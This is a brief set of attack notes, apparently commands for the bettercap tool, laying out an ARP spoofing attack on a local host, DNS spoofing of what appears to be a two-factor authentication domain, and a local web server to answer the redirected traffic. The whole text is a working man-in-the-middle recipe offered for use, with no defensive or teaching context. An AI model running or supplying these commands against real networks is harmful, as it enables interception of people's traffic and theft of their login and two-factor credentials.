Perform ARP spoofing attack:

	echo 1 > /proc/sys/net/ipv4/ip_forward

	set arp.spoof.targets 192.168.5.99

Perform DNS spoofing attack:

	set dns.spoof.domains 2fa.tavanoapps.com
	set dns.spoof.all true
	dns.spoof on

Active web server:

	set http.server.path /var/www/html
	http.server on
